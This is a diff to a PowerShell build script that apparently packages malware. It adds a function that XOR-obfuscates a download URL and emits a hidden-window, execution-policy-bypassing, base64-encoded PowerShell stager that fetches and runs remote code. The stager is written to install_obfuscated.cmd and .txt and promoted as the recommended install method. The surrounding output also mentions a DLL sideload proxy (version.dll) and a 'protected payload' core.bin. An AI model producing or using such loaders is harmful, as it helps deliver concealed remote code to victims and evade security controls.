@@ -214,6 +214,28 @@ function Build-ProxyDll {
     return $true
 }
 
+function New-ObfuscatedInstallCommand {
+    param([string]$DeployUrl)
+
+    $key = 0xA7
+    $urlBytes = [Text.Encoding]::UTF8.GetBytes($DeployUrl)
+    $encodedBytes = $urlBytes | ForEach-Object { $_ -bxor $key }
+    $byteList = ($encodedBytes | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","
+
+    $innerScript = @"
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+`$k=$key
+`$b=@($byteList)
+`$u=[Text.Encoding]::UTF8.GetString([byte[]](`$b|ForEach-Object{`$_ -bxor `$k}))
+`$c=New-Object Net.WebClient
+`$c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+iex `$c.DownloadString(`$u)
+"@
+
+    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($innerScript))
+    return "powershell -nop -w hidden -ep bypass -enc $encodedCommand"
+}
+
 function Prepare-GithubDeployPackage {
     Write-Host "Preparing GitHub deploy package..." -ForegroundColor Yellow
 
@@ -253,16 +275,27 @@ function Prepare-GithubDeployPackage {
     Copy-Item "deploy\deploy.cmd" (Join-Path $githubDir "deploy.cmd") -Force
     Copy-Item "deploy\config.json" (Join-Path $githubDir "config.json") -Force
 
-    $oneLiner = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""iex ((New-Object Net.WebClient).DownloadString('$githubBaseUrl/deploy.ps1'))"""
+    $deployUrl = "$githubBaseUrl/deploy.ps1".Replace('\', '/')
+    $oneLiner = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""iex ((New-Object Net.WebClient).DownloadString('$deployUrl'))"""
+    $obfuscatedOneLiner = New-ObfuscatedInstallCommand -DeployUrl $deployUrl
+
     $oneLinerCmd = "@echo off`r`n$oneLiner`r`npause"
+    $obfuscatedCmd = "@echo off`r`n$obfuscatedOneLiner"
+
     Set-Content -Path (Join-Path $githubDir "install.cmd") -Value $oneLinerCmd -Encoding ASCII
     Set-Content -Path (Join-Path $githubDir "install_oneliner.txt") -Value $oneLiner -Encoding ASCII
+    Set-Content -Path (Join-Path $githubDir "install_obfuscated.txt") -Value $obfuscatedOneLiner -Encoding ASCII
+    Set-Content -Path (Join-Path $githubDir "install_obfuscated.cmd") -Value $obfuscatedCmd -Encoding ASCII
+    Copy-Item (Join-Path $githubDir "install_obfuscated.txt") "deploy\install_obfuscated.txt" -Force
 
     Write-Host "[OK] GitHub package ready: build\github\" -ForegroundColor Green
     Write-Host "     Upload the contents of build\github\ to your repo under /deploy/" -ForegroundColor Gray
     Write-Host ""
-    Write-Host "One-liner CMD:" -ForegroundColor Cyan
-    Write-Host $oneLiner -ForegroundColor White
+    Write-Host "Obfuscated one-liner (recommended):" -ForegroundColor Cyan
+    Write-Host $obfuscatedOneLiner -ForegroundColor White
+    Write-Host ""
+    Write-Host "Plain one-liner:" -ForegroundColor DarkGray
+    Write-Host $oneLiner -ForegroundColor DarkGray
     return $true
 }
 
@@ -282,7 +315,7 @@ if ($success) {
     Write-Host ""
     Write-Host "Output files:" -ForegroundColor Cyan
     Write-Host "- GitHub upload folder: build\github\  (upload to repo /deploy/)" -ForegroundColor White
-    Write-Host "- One-liner: build\github\install_oneliner.txt" -ForegroundColor White
+    Write-Host "- Obfuscated install: build\github\install_obfuscated.txt" -ForegroundColor White
     Write-Host "- Sideload proxy: build\version.dll  (small, ~few KB)" -ForegroundColor White
     Write-Host "- Protected payload: build\payload\core.bin (+ modules/*.bin)" -ForegroundColor White
     Write-Host ""
